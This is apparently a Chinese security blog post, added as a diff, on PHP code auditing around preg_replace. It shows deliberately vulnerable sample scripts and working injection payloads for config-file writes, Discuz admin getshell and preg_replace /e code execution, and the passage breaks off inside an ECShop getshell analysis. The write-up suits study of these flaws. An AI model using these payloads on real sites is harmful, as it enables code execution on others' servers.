@@ -1,0 +1,707 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.1">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.1" color="#222">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.1">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '7.4.1',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Copy',
+      copy_success: 'Copied',
+      copy_failure: 'Copy failed'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="从preg_replace窥探php代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从preg_replace窥探php代码审计">
+<meta property="og:url" content="http://yoursite.com/2020/04/15/从preg-replace窥探php代码审计/index.html">
+<meta property="og:site_name" content="su33er的博客">
+<meta property="og:description" content="从preg_replace窥探php代码审计">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/15/JiQnt1.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/15/JiQmkR.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/15/JiQZ79.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/15/JilpHH.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/15/JilxGq.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/15/Jilvin.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/15/JiNuh4.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/15/JiaLc9.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/15/Jialex.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/15/Jir21U.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/15/JirRcF.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/15/Jir6hV.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/15/JismEn.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/04/16/JF26JA.png">
+<meta property="og:updated_time" content="2020-04-16T03:41:16.124Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="从preg_replace窥探php代码审计">
+<meta name="twitter:description" content="从preg_replace窥探php代码审计">
+<meta name="twitter:image" content="https://s1.ax1x.com/2020/04/15/JiQnt1.png">
+  <link rel="canonical" href="http://yoursite.com/2020/04/15/从preg-replace窥探php代码审计/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>从preg_replace窥探php代码审计 | su33er的博客</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+  
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">su33er的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+        
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-偶尔看看女神">
+      
+    
+
+    <a href="/qiangfu/" rel="section"><i class="fa fa-fw fa-calendar"></i>偶尔看看女神</a>
+
+  </li>
+      
+    
+  </ul>
+
+    
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/15/从preg-replace窥探php代码审计/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="su33er">
+      <meta itemprop="description" content="心之所向皆是遗憾，目之所及皆是过往">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="su33er的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            从preg_replace窥探php代码审计
+            
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              
+                
+              
+
+              <time title="Created: 2020-04-15 23:05:01" itemprop="dateCreated datePublished" datetime="2020-04-15T23:05:01+08:00">2020-04-15</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-04-16 11:41:16" itemprop="dateModified" datetime="2020-04-16T11:41:16+08:00">2020-04-16</time>
+              </span>
+            
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>从preg_replace窥探php代码审计</p>
+<a id="more"></a>
+
+<h2 id="经典写入配置漏洞"><a href="#经典写入配置漏洞" class="headerlink" title="经典写入配置漏洞:"></a>经典写入配置漏洞:</h2><p>Test.php:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str = addslashes($_GET[&apos;option&apos;]);</span><br><span class="line">$file = file_get_contents(&apos;./option.php&apos;);</span><br><span class="line">$file = preg_replace(&apos;|\$option=\&apos;.*\&apos;;|&apos;,&quot;\$option=&apos;$str&apos;;&quot;,$file);</span><br><span class="line">file_put_contents(&apos;./option.php&apos;,$file);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>option.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$option=&apos;test&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解法1-利用反斜线"><a href="#解法1-利用反斜线" class="headerlink" title="解法1 利用反斜线"></a>解法1 利用反斜线</h3><p>输入<code>\&#39;;phpinfo();//</code></p>
+<p><img src="https://s1.ax1x.com/2020/04/15/JiQnt1.png" alt="JiQnt1.png"></p>
+<p><code>\&#39;</code>经过<code>addslashes()</code>之后变为<code>\\\&#39;</code>，随后preg_replace会将两个连续的\合并为一个，也就是将<code>\\\&#39;</code>转为<code>\\&#39;</code>，这样我们就成功引入了一个单引号，闭合上文注释下文，中间加入要执行的代码即可。</p>
+<p>看来是preg_replace函数特性。经测试，<strong>该函数会针对反斜线进行转义，即成对出现的两个反斜线合并为一个</strong>，</p>
+<p><img src="https://s1.ax1x.com/2020/04/15/JiQmkR.png" alt="JiQmkR.png"></p>
+<p>phpinfo()成功写入到option.php</p>
+<p><img src="https://s1.ax1x.com/2020/04/15/JiQZ79.png" alt="JiQZ79.png"></p>
+<p><a href="https://imgchr.com/i/JilpHH" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/04/15/JilpHH.png" alt="JilpHH.png"></a></p>
+<h3 id="解法2-利用正则"><a href="#解法2-利用正则" class="headerlink" title="解法2 利用正则"></a>解法2 利用正则</h3><p>过程分为两个请求：</p>
+<p>第一次传入 <code>aaa&#39;;phpinfo();%0a//</code></p>
+<p>此时文件内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$option=&apos;aaa\&apos;;phpinfo();</span><br><span class="line">//&apos;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s1.ax1x.com/2020/04/15/JilxGq.png" alt="JilxGq.png"></p>
+<p>第二次传入随意字串，如<code>bbb</code> 正则代码<code>.*</code>会将匹配到的<code>aaa\</code>替换为<code>bbb</code></p>
+<p>此时文件内容(成功写入恶意代码)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$option=&apos;bbb&apos;;phpinfo();</span><br><span class="line">//&apos;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s1.ax1x.com/2020/04/15/Jilvin.png" alt="Jilvin.png"></p>
+<h3 id="解法3-利用-00"><a href="#解法3-利用-00" class="headerlink" title="解法3 利用%00"></a>解法3 利用%00</h3><p>仍然分为两步。</p>
+<p>第一次传入<code>;phpinfo();</code> 此时文件内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$option=&apos;;phpinfo();&apos;;</span><br></pre></td></tr></table></figure>
+
+<p>第二次传入<code>%00</code></p>
+<p><code>%00</code>被<code>addslashes()</code>转为<code>\0</code>，而<code>\0</code>在<code>preg_replace</code>函数中会被替换为“匹配到的全部内容”，此时<code>preg_replace</code>要执行的代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&apos;|\$option=\&apos;.*\&apos;;|&apos;,&quot;\$option=&apos;\0&apos;;&quot;,$file);</span><br></pre></td></tr></table></figure>
+
+<p>也就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&apos;|\$option=\&apos;.*\&apos;;|&apos;,&quot;\$option=&apos;$option=&apos;;phpinfo();&apos;;&apos;;&quot;,$file);</span><br></pre></td></tr></table></figure>
+
+<p>成功引入单引号闭合，最终写入shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$option=&apos;\$option=&apos;;phpinfo();&apos;;&apos;;</span><br></pre></td></tr></table></figure>
+
+<p><strong><em>偷懒不试了</em></strong></p>
+<h3 id="相关—discuz-后台getshell"><a href="#相关—discuz-后台getshell" class="headerlink" title="相关—discuz 后台getshell"></a>相关—discuz 后台getshell</h3><p><img src="https://s1.ax1x.com/2020/04/15/JiNuh4.png" alt="JiNuh4.png"></p>
+<p>在 updateapps 函数中完成了对 uc_api 的更新，这里的正则在匹配时是非贪婪的，这里就会存在一个问题，当uc_api为 <code>define(&#39;UC_API&#39;, &#39;http://127.0.0.1/discuz34/uc_server\&#39;);phpinfo();//&#39;);</code> 时，我们执行updateapps函数来更新uc_api时就会将phpinfo();释放出来。 要使用updateapps函数来更新uc_api，我们需要知道UC_KEY(dz)的值，而UC_KEY(dz)的值，恰好是我们后台可以设置的</p>
+<p><a href="https://mp.weixin.qq.com/s/8OueE-bEIdkvwPWu3KqrcQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/8OueE-bEIdkvwPWu3KqrcQ</a></p>
+<h2 id="preg-replace函数之命令执行"><a href="#preg-replace函数之命令执行" class="headerlink" title="preg_replace函数之命令执行"></a>preg_replace函数之命令执行</h2><p>来自红日安全-代码审计Day8 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">	function complexStrtolower($regex,$value)&#123;</span><br><span class="line">		return preg_replace(</span><br><span class="line">			&apos;/(&apos;. $regex . &apos;)/ei&apos;,</span><br><span class="line">			&apos;strtolower(&quot;\\1&quot;)&apos;,</span><br><span class="line">			$value</span><br><span class="line">		);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	foreach($_GET as $regex =&gt; $value)&#123;</span><br><span class="line">		echo complexStrtolower($regex,$value) . &quot;\n&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	print_r($_GET);</span><br><span class="line">	</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><a href="http://php.net/manual/zh/function.preg-replace.php" target="_blank" rel="noopener"><strong>preg_replace</strong></a>：(PHP 5.5)</p>
+<p><strong>功能</strong> ： 函数执行一个正则表达式的搜索和替换</p>
+<p><strong>定义</strong> ： <code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code></p>
+<p>搜索 <strong>subject</strong> 中匹配 <strong>pattern</strong> 的部分， 如果匹配成功以 <strong>replacement</strong> 进行替换</p>
+</blockquote>
+<ul>
+<li><strong>$pattern</strong> 存在 <strong>/e</strong> 模式修正符，允许代码执行</li>
+<li><strong>/e</strong> 模式修正符，是 <strong>preg_replace() \</strong> 将 *<em>$replacement*</em> 当做php代码来执行</li>
+</ul>
+<p><img src="https://s1.ax1x.com/2020/04/15/JiaLc9.png" alt="JiaLc9.png"></p>
+<p><strong>漏洞解析</strong></p>
+<p>这道题目考察的是 <strong>preg_replace</strong> 函数使用 <strong>/e</strong> 模式，导致代码执行的问题。我们发现在上图代码 <strong>第11行</strong> 处，将 <strong>GET</strong> 请求方式传来的参数用在了 <strong>complexStrtolower</strong> 函数中，而变量 <strong>$regex</strong> 和 <strong>$value</strong> 又用在了存在代码执行模式的 <strong>preg_replace</strong> 函数中。所以，我们可以通过控制 <strong>preg_replace</strong> 函数第1个、第3个参数，来执行代码。但是可被当做代码执行的第2个参数，却固定为 <strong>‘strtolower(“\1”)’</strong> 。时间上，这里涉及到正则表达式反向引用的知识，即此处的 <strong>\1</strong> ，大家可以参考 <a href="https://www.w3cschool.cn/zhengzebiaodashi/regexp-syntax.html" target="_blank" rel="noopener"><strong>W3Cschool</strong></a> 上的解释：</p>
+<blockquote>
+<p><strong>反向引用</strong></p>
+<p>对一个正则表达式模式或部分模式 <strong>两边添加圆括号</strong> 将导致相关 <strong>匹配存储到一个临时缓冲区</strong> 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p>
+</blockquote>
+<h4 id="关于反向引用，给个例子"><a href="#关于反向引用，给个例子" class="headerlink" title="关于反向引用，给个例子"></a>关于反向引用，给个例子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查找重复的单词：</span><br><span class="line"></span><br><span class="line">var str = &quot;Is is the cost of of gasoline going up up&quot;;</span><br><span class="line">var patt1 = /\b([a-z]+) \1\b/ig;</span><br><span class="line">document.write(str.match(patt1));</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://imgchr.com/i/Jialex" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/04/15/Jialex.png" alt="Jialex.png"></a></p>
+<p>捕获的表达式，正如 <strong>[a-z]+</strong> 指定的，包括一个或多个字母。正则表达式的第二部分是对以前捕获的子匹配项的引用，即，单词的第二个匹配项正好由括号表达式匹配。<strong>\1</strong> 指定第一个子匹配项。</p>
+<p>单词边界元字符确保只检测整个单词。否则，诸如 “is issued” 或 “this is” 之类的词组将不能正确地被此表达式识别。</p>
+<p>正则表达式后面的全局标记 <strong>g</strong> 指定将该表达式应用到输入字符串中能够查找到的尽可能多的匹配。</p>
+<p>表达式的结尾处的不区分大小写 <strong>i</strong> 标记指定不区分大小写。</p>
+<p>多行标记指定换行符的两边可能出现潜在的匹配。</p>
+<p>反向引用还可以将通用资源指示符 (URI) 分解为其组件。假定您想将下面的 URI 分解为协议（ftp、http 等等）、域地址和页/路径：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.runoob.com:80/html/html-tutorial.html</span><br></pre></td></tr></table></figure>
+
+<h4 id="回归题目"><a href="#回归题目" class="headerlink" title="回归题目:"></a>回归题目:</h4><p><strong>payload</strong> ：<strong>\S*=${phpinfo()}</strong> </p>
+<p><a href="https://imgchr.com/i/Jir21U" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/04/15/Jir21U.png" alt="Jir21U.png"></a></p>
+<p><a href="https://imgchr.com/i/JirRcF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/04/15/JirRcF.png" alt="JirRcF.png"></a></p>
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">preg_replace(&apos;/(.*)/ie&apos;,&apos;strtolower(&quot;\\1&quot;)&apos;,&apos;phpinfo()&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>没有执行oh-info,为什么?</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&apos;/(.*)/i&apos;,$value,$match);</span><br><span class="line">eval(&apos;strtolower(&quot;$match[0]&quot;);&apos;);</span><br><span class="line">当我们输入$value = &apos;phpinfo()&apos;时</span><br><span class="line">$match[0] = &apos;phpinfo()&apos;;</span><br><span class="line">eval(&apos;strtolower(&quot;phpinfo()&quot;);&apos;);</span><br><span class="line">执行结果自然是&apos;phpinfo()&apos;</span><br></pre></td></tr></table></figure>
+
+<p>因为<strong>preg_replace/e</strong>只执行一次代码，即<strong>strtolower</strong>函数，所以我们必须想办法让输入的<strong>phpinfo()</strong>自己执行，这就涉及到了<strong>php动态变量</strong>，根据原贴给出payload为<strong>{${phpinfo()}}</strong>，为什么，我们知道php变量名经过<strong>{}</strong>包裹后会将变量值输出,而这里<strong>phpinfo</strong>被<strong>{}</strong>包裹后会首先执行<strong>phpinfo()</strong>，执行结果返回<strong>true</strong>，那么我们画一个等价的式子</p>
+<p><strong>plain</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$&#123;phpinfo()&#125;&#125; == &#123;$true&#125; == &#123;null&#125; == &apos;&apos;</span><br></pre></td></tr></table></figure>
+
+<p>我们继续测试一下：</p>
+<p><strong>php</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">preg_replace(&apos;/(.*)/ie&apos;,&apos;strtolower(&quot;\\1&quot;)&apos;,&apos;&#123;$&#123;phpinfo()&#125;&#125;&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://imgchr.com/i/Jir6hV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/04/15/Jir6hV.png" alt="Jir6hV.png"></a></p>
+<p>本题官方给的 <strong>payload</strong> ：<strong>/?.*={${phpinfo()}}</strong> 实际上并不能用，因为如果GET请求的参数名存在非法字符，PHP会将其替换成下划线，即 <code>.*</code> 会变成 <code>_*</code> 。</p>
+<p><img src="https://s1.ax1x.com/2020/04/15/JismEn.png" alt="JismEn.png"></p>
+<p>我们可以看到<strong>点号.</strong>被替换成了<strong>下划线_</strong>，这是因为php自动将非法字符替换成了下划线，我们换个通用字符即可，因此payload:<strong>/?\S*={${phpinfo()}}</strong></p>
+<p>详细解答参考:<a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">https://xz.aliyun.com/t/2557</a></p>
+<h2 id="ECShop前台注入和getshell漏洞"><a href="#ECShop前台注入和getshell漏洞" class="headerlink" title="ECShop前台注入和getshell漏洞"></a>ECShop前台注入和getshell漏洞</h2><p>ecshop/user.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">elseif ($action == &apos;login&apos;)</span><br><span class="line">&#123;</span><br><span class="line">    if (empty($back_act))</span><br><span class="line">    &#123;</span><br><span class="line">        if (empty($back_act) &amp;&amp; isset($GLOBALS[&apos;_SERVER&apos;][&apos;HTTP_REFERER&apos;]))</span><br><span class="line">        &#123;</span><br><span class="line">            $back_act = strpos($GLOBALS[&apos;_SERVER&apos;][&apos;HTTP_REFERER&apos;], &apos;user.php&apos;) ? &apos;./index.php&apos; : $GLOBALS[&apos;_SERVER&apos;][&apos;HTTP_REFERER&apos;];</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            $back_act = &apos;user.php&apos;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $captcha = intval($_CFG[&apos;captcha&apos;]);</span><br><span class="line">    if (($captcha &amp; CAPTCHA_LOGIN) &amp;&amp; (!($captcha &amp; CAPTCHA_LOGIN_FAIL) || (($captcha &amp; CAPTCHA_LOGIN_FAIL) &amp;&amp; $_SESSION[&apos;login_fail&apos;] &gt; 2)) &amp;&amp; gd_version() &gt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">        $GLOBALS[&apos;smarty&apos;]-&gt;assign(&apos;enabled_captcha&apos;, 1);</span><br><span class="line">        $GLOBALS[&apos;smarty&apos;]-&gt;assign(&apos;rand&apos;, mt_rand());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $smarty-&gt;assign(&apos;back_act&apos;, $back_act);</span><br><span class="line">    $smarty-&gt;display(&apos;user_passport.dwt&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>$back_act</code>是从<code>HTTP_REFERER</code>获取到的，<code>HTTP_REFERER</code>是外部可控的</p>
+<p>接着将<code>back_act</code>变量传递给<code>assign</code>函数，跟进<code>ecshop/includes/cls_template.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function assign($tpl_var, $value = &apos;&apos;)</span><br><span class="line">&#123;</span><br><span class="line">    if (is_array($tpl_var))</span><br><span class="line">    &#123;</span><br><span class="line">        foreach ($tpl_var AS $key =&gt; $val)</span><br><span class="line">        &#123;</span><br><span class="line">            if ($key != &apos;&apos;)</span><br><span class="line">            &#123;</span><br><span class="line">                $this-&gt;_var[$key] = $val;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        if ($tpl_var != &apos;&apos;)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;_var[$tpl_var] = $value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个函数的功能，是注册模板变量，也就是<code>$back_act</code>变成了<code>$this-&gt;_var[$back_act]=$back_act</code>，而后调用<code>display</code>函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">function display($filename, $cache_id = &apos;&apos;)</span><br><span class="line">&#123;</span><br><span class="line">    $this-&gt;_seterror++;</span><br><span class="line">    error_reporting(E_ALL ^ E_NOTICE);</span><br><span class="line"></span><br><span class="line">    $this-&gt;_checkfile = false;</span><br><span class="line">    $out = $this-&gt;fetch($filename, $cache_id);</span><br><span class="line"></span><br><span class="line">    if (strpos($out, $this-&gt;_echash) !== false)</span><br><span class="line">    &#123;</span><br><span class="line">        $k = explode($this-&gt;_echash, $out);</span><br><span class="line">        foreach ($k AS $key =&gt; $val)</span><br><span class="line">        &#123;</span><br><span class="line">            if (($key % 2) == 1)</span><br><span class="line">            &#123;</span><br><span class="line">                $k[$key] = $this-&gt;insert_mod($val);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $out = implode(&apos;&apos;, $k);</span><br><span class="line">    &#125;</span><br><span class="line">    error_reporting($this-&gt;_errorlevel);</span><br><span class="line">    $this-&gt;_seterror--;</span><br><span class="line"></span><br><span class="line">    echo $out;</span><br><span 